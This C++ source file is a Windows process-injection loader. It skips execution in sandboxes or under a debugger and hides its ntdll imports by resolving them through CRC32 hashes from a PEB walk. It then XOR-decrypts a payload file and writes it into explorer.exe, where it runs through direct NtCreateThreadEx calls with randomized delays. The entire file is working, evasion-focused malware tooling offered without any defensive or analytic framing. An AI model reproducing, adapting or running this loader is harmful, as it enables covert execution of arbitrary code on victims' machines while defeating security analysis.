#include <iostream>  
#include <Windows.h>  
#include <TlHelp32.h>  
#include <vector>
#include <fstream>
#include <string.h>
#include <stdint.h>
#include <winternl.h>

typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
    _In_ HANDLE ProcessHandle,
    _Inout_ _At_(*BaseAddress, _Readable_bytes_(*RegionSize) _Writable_bytes_(*RegionSize) _Post_readable_byte_size_(*RegionSize)) PVOID* BaseAddress,
    _In_ ULONG_PTR ZeroBits,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG AllocationType,
    _In_ ULONG PageProtection
);
typedef NTSTATUS(NTAPI* pNtOpenProcess)(
    _Out_ PHANDLE ProcessHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ PVOID ObjectAttributes,
    _In_opt_ CLIENT_ID* ClientId
    );
typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    _Out_ PHANDLE ThreadHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ PVOID ObjectAttributes,
    _In_ HANDLE ProcessHandle,
    _In_ PVOID StartRoutine,
    _In_opt_ PVOID Argument,
    _In_ ULONG CreateFlags, // THREAD_CREATE_FLAGS_*
    _In_ SIZE_T ZeroBits,
    _In_ SIZE_T StackSize,
    _In_ SIZE_T MaximumStackSize,
    _In_opt_ PVOID AttributeList
    );
typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory) (
    _In_ HANDLE ProcessHandle,
    _In_opt_ PVOID BaseAddress,
    _In_reads_bytes_(NumberOfBytesToWrite) PVOID Buffer,
    _In_ SIZE_T NumberOfBytesToWrite,
    _Out_opt_ PSIZE_T NumberOfBytesWritten
	);
typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)(
    _In_ HANDLE ProcessHandle,
    _Inout_ PVOID* BaseAddress,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG NewProtection,
    _Out_ PULONG OldProtection
    );

using namespace std;
struct crc32
{
    static void generate_table(uint32_t(&table)[256])
    {
        uint32_t polynomial = 0xEDB88320;
        for (uint32_t i = 0; i < 256; i++)
        {
            uint32_t c = i;
            for (size_t j = 0; j < 8; j++)
            {
                if (c & 1) {
                    c = polynomial ^ (c >> 1);
                }
                else {
                    c >>= 1;
                }
            }
            table[i] = c;
        }
    }
    static uint32_t update(uint32_t(&table)[256], uint32_t initial, const void* buf, size_t len)
    {
        uint32_t c = initial ^ 0xFFFFFFFF;
        const uint8_t* u = static_cast<const uint8_t*>(buf);
        for (size_t i = 0; i < len; ++i)
        {
            c = table[(c ^ u[i]) & 0xFF] ^ (c >> 8);
        }
        return c ^ 0xFFFFFFFF;
    }
};
string to_lower(const char* s) {
    string result(s);
    for (char& c : result) {
        c = tolower((unsigned char)c);
    }
    return result;
}

DWORD getHash(string buf) {
    uint32_t table[256];
    crc32::generate_table(table);
    string lower_buf = to_lower(buf.c_str());
    DWORD crc = crc32::update(table, 0, lower_buf.c_str(), lower_buf.length());
    return crc;
}

int findMyProc(const char* procname) {

    HANDLE hSnapshot;
    PROCESSENTRY32W pe;
    int pid = 0;
    BOOL hResult;
	// create a snapshot of all processes in the system
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    pe.dwSize = sizeof(PROCESSENTRY32W);
    hResult = Process32FirstW(hSnapshot, &pe);
    while (hResult) {
        wstring ws(pe.szExeFile);
        string exeFile(ws.begin(), ws.end());
		exeFile = to_lower(exeFile.c_str());
		cout << "Checking process: " << exeFile << endl;
        if (strcmp(procname, exeFile.c_str()) == 0) {

            pid = pe.th32ProcessID;
            cout << "Found pid: " << pid << endl;
            break;
        }
        hResult = Process32NextW(hSnapshot, &pe);
    }
    CloseHandle(hSnapshot);
    return pid;
}
bool isSandboxEnvironment() {
    // Check for common sandbox indicators
    DWORD tickCount = GetTickCount();
    Sleep(1000);
    DWORD newTickCount = GetTickCount();
    if ((newTickCount - tickCount) < 900) {
        return true; // Likely in sandbox
    }

    // Check system uptime
    ULONGLONG uptime = GetTickCount64();
    if (uptime < 120000) { // Less than 5 minutes
        return true;
    }

    // Check for debugger
    if (IsDebuggerPresent()) {
        return true;
    }

    return false;
}
vector<unsigned char> readFile(const char* filename) {
    std::ifstream file(filename, std::ios::binary);
    std::vector<unsigned char> buf((std::istreambuf_iterator<char>(file)), {});
    return buf;
}


HMODULE getModuleHandleByHash(DWORD hashValue) {
#ifdef _M_X64
    PPEB peb = (PPEB)__readgsqword(0x60);
#else
    PPEB peb = (PPEB)__readfsdword(0x30);
#endif
    PPEB_LDR_DATA ldr = peb->Ldr;
    PLIST_ENTRY head = &ldr->InMemoryOrderModuleList;
    PLIST_ENTRY entry = head->Flink;

    HMODULE hModule = NULL;
    while (entry != head) {
        PLDR_DATA_TABLE_ENTRY module = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        char module_name[MAX_PATH] = { 0 };
        WideCharToMultiByte(CP_ACP, 0, module->FullDllName.Buffer, module->FullDllName.Length / sizeof(WCHAR), module_name, MAX_PATH - 1, NULL, NULL);
		//cout << "Checking module: " << module_name << " hash: " << hex << getHash(module_name) << endl;
        unsigned long module_hash = getHash(module_name);
        
        if (module_hash == hashValue) {
            hModule = (HMODULE)module->DllBase;
            break;
        }
        entry = entry->Flink;
    }

    return hModule;
}

PVOID getProcAddressByHash(HMODULE hModule, DWORD hashValue) {
    if (hModule == NULL) {
        cout << "Error: hModule is NULL" << endl;
        return NULL;
    }
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        cout << "Error: Invalid DOS header signature: 0x" << hex << dosHeader->e_magic << endl;
        return NULL;
    }
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((unsigned char*)dosHeader + dosHeader->e_lfanew);
    IMAGE_DATA_DIRECTORY exportDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

    PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + exportDir.VirtualAddress);
    DWORD* addressOfFunctions = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfFunctions);
    DWORD* addressOfNames = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfNames);
    WORD* addressOfNameOrdinals = (WORD*)((BYTE*)hModule + exportDirectory->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exportDirectory->NumberOfNames; i++) {
        char* functionName = (char*)((BYTE*)hModule + addressOfNames[i]);
		//cout << "Checking function: " << functionName << " hash: " << getHash(functionName) << endl;
        DWORD functionHash = getHash(functionName);
        if (functionHash == hashValue) {
			cout << "Found function: " << functionName << endl;
            WORD ordinal = addressOfNameOrdinals[i];
            DWORD functionRva = addressOfFunctions[ordinal];
            return (PVOID)((BYTE*)hModule + functionRva);
        }
    }

    return NULL;
}



int main()
{
    if (isSandboxEnvironment()) {
        return 1;
	}
    int pid = findMyProc("explorer.exe");
    if (pid == 0) {
        cout << "Process not found" << endl;
        return 1;
    }

    //0x84c05e40

    HMODULE hNtdll = getModuleHandleByHash(0xba73f01a);

    vector<unsigned char> buf_vector = readFile("payload");
    vector<unsigned char> key = readFile("key");

    unsigned long long buf_len = buf_vector.size();
    for (size_t i = 0; i < buf_len; ++i) {
        buf_vector[i] ^= key[i];
    }
    unsigned char* buf = new unsigned char[buf_len];
    copy(buf_vector.begin(), buf_vector.end(), buf);

    

	PVOID pntCT = getProcAddressByHash(hNtdll, 0x96da030b); // hash of NtCreateThreadEx
	PVOID pntAVM = getProcAddressByHash(hNtdll, 0xc1894868); // hash of NtAllocateVirtualMemory
	PVOID pntOP = getProcAddressByHash(hNtdll, 0x21ac7c0b); // hash of NtOpenProcess
	PVOID pntPVM = getProcAddressByHash(hNtdll, 0x7a9c969c); // hash of NtProtectVirtualMemory
	PVOID pntWVM = getProcAddressByHash(hNtdll, 0x17ef3fc1); // hash of NtWriteVirtualMemory
	
    //OpenProcess -> VirtualAllocEx -> WriteProcessMemory -> ProtectVirtualMemory-> CreateThreadEx 
    pNtOpenProcess ntOP = (pNtOpenProcess)pntOP;
    pNtAllocateVirtualMemory ntAVM = (pNtAllocateVirtualMemory)pntAVM;
	pNtProtectVirtualMemory ntPVM = (pNtProtectVirtualMemory)pntPVM;
	pNtWriteVirtualMemory ntWVM = (pNtWriteVirtualMemory)pntWVM;
    pNtCreateThreadEx ntCTE = (pNtCreateThreadEx)pntCT;

    // OpenProcess
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

    HANDLE proc = NULL;
    CLIENT_ID cid = { 0 };
    cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
    cid.UniqueThread = 0;
    
    NTSTATUS status = ntOP(&proc, PROCESS_ALL_ACCESS, &objAttr, &cid);
    if (!NT_SUCCESS(status) || proc == NULL) {
        cout << "NtOpenProcess failed" << endl;
        return 1;
    }
    cout << "OpenProcess success" << endl;
    Sleep(rand() % 5000 + 1000);
	// AllocateVirtualMemory
    PVOID mem = NULL;
    ntAVM(proc, &mem, 0, &buf_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    //LPVOID mem = VirtualAllocEx(proc, NULL, buf_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (mem == NULL) {
        cout << "VirtualAllocEx failed" << endl;
        CloseHandle(proc);
        delete[] buf;
        return 1;
    }
	cout << "VirtualAllocEx success" << endl;
    Sleep(rand() % 5000 + 1000);

    // WriteProcessMemory
    SIZE_T bytesWritten;
    status = ntWVM(proc, mem, buf, buf_len, &bytesWritten);
    if (!NT_SUCCESS(status)) {
        cout << "NtWriteVirtualMemory failed"<< endl;
        CloseHandle(proc);
        delete[] buf;
        return 1;
    }
    cout << "WriteProcessMemory success" << endl;
    Sleep(rand() % 5000 + 1000);

    // ProtectVirtualMemory
    ULONG oldProtect;
    SIZE_T regionSize = buf_len;
    status = ntPVM(proc, &mem, &regionSize, PAGE_EXECUTE_READWRITE, &oldProtect);
    if (!NT_SUCCESS(status)) {
        cout << "NtProtectVirtualMemory failed" << endl;
        CloseHandle(proc);
        delete[] buf;
        return 1;
    }
    cout << "ProtectVirtualMemory success" << endl;
    Sleep(rand() % 5000 + 1000);

    // CreateThreadEx
    HANDLE hThread = NULL;
    status = ntCTE(&hThread, THREAD_ALL_ACCESS, NULL, proc, mem, NULL, 0, 0, 0, 0, NULL);
    if (!NT_SUCCESS(status) || hThread == NULL) {
        cout << "NtCreateThreadEx failed"<< endl;
        CloseHandle(proc);
        delete[] buf;
        return 1;
    }
    cout << "Thread created successfully" << endl;

    //WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    CloseHandle(proc);
    return 0;
}
